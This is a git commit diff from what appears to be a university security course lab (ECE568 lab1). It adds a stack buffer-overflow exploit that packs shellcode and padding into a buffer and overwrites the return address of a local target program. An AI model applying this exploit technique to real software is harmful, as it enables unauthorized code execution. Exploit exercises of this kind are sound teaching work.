8e81696e170f4fd29319b0794b82fcad15de9e23
Mahsa Naserifar <mahsa@render.com>
2020-01-29 15:55:15 -0500

    Added polit 1

--- ECE568-lab1/sploits/sploit1.c
+++ ECE568-lab1/sploits/sploit1.c
@@ -5,15 +5,34 @@
 #include "shellcode-64.h"
 
 #define TARGET "../targets/target1"
+#define BUFSIZE 125
+#define TARGET_RA_ADDR 0x202dfe10
+#define SHELL_LENGTH 45
 
 int
 main ( int argc, char * argv[] )
 {
 	char *	args[3];
 	char *	env[1];
+	char attack_buffer[BUFSIZE];
+	int *p;
+
+	for(int i = 0; i< BUFSIZE;i++)
+		attack_buffer[i] = 0x04;
+	
+	for(int i = 0; i< SHELL_LENGTH;i++)
+		attack_buffer[i] = shellcode[i];
+	
+	for(int i = 45 ; i < 120; i++)
+		attack_buffer[i] = 0x05;
+
+	int *a = (int*)&attack_buffer[120];
+	*a = TARGET_RA_ADDR;
+
+	attack_buffer[BUFSIZE-1] = '\0';
 
 	args[0] = TARGET;
-	args[1] = "hi there";
+	args[1] = attack_buffer;
 	args[2] = NULL;
 
 	env[0] = NULL;
